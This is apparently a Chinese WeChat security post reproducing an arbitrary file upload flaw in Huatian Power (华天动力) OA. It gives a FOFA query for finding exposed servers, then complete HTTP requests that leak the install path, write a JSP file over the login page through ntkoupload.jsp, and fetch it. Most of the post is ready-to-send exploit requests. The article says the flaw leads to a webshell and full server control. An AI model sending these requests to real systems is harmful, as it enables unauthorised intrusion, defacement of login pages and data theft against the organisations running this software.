<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NUn3NJcIB3Vb5NCUthdk0Q)

#### 漏洞描述

华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。睿智的管理者通过使用华天动力协同办公平台，在加强规范工作流程、强化团队执行、推动精细管理、促进营业增长等工作中取得了良好的成效。华天动力 OA 存在任意文件上传漏洞，攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia5FQH8eqb637Q5N1iaoSxD5Vyuuk7kTAnPDQA7yRKWck7LcOSUhYcUmBlCh80f4faZI1hFibqfHQsCg/640?wx_fmt=png)

#### fofa

```
body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"

```

#### 漏洞复现

获取绝对路径：

```
POST /OAapp/jsp/upload.jsp HTTP/1.1
Host: xxx.xxx.xxx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 294
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; 
Content-Type: image/png
real path
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; 
zhang3.png
------WebKitFormBoundary5Ur8laykKAWws2QO--

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia5FQH8eqb637Q5N1iaoSxD5VEVLqibyCWJKPRkUJmcrFMPrFHaQwQLPPMtFqBaABYxgeWeKUbwAr3uw/640?wx_fmt=png)

写入 normalLoginPageForOther.jsp 文件:

```
POST /OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp HTTP/1.1
Host: xx.xxx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 392
------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; 
Content-Type: image/png
<%out.print("hello world");%>
------WebKitFormBoundaryzRSYXfFlXqk6btQm
Content-Disposition: form-data; 
D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
------WebKitFormBoundaryzRSYXfFlXqk6btQm--

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia5FQH8eqb637Q5N1iaoSxD5VxTOrCLLzmFewChoDIL5GLxkaagrHbaHjIJBH6ln4x6yqp7ZH4Da93A/640?wx_fmt=png)

访问 normalLoginPageForOther.jsp 文件:

```
GET /OAapp/htpages/app/module/login/normalLoginPageForOther.jsp HTTP/1.1
Host: xx.xxx.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://x.x.x.x
DNT: 1
Connection: close
Cookie: JSESSIONID=63A1AF6B0B60634BF5B8E71AB4D88B85
Upgrade-Insecure-Requests: 1

```

![](https://mmbiz.qpic.cn/mmbiz_png/sajqow3Sgia5FQH8eqb637Q5N1iaoSxD5V1emFAV6s8e0Thzbw8KNToqic8ZiaHNyAOztUSgWjibeHGJAPyNTJ4FLEw/640?wx_fmt=png)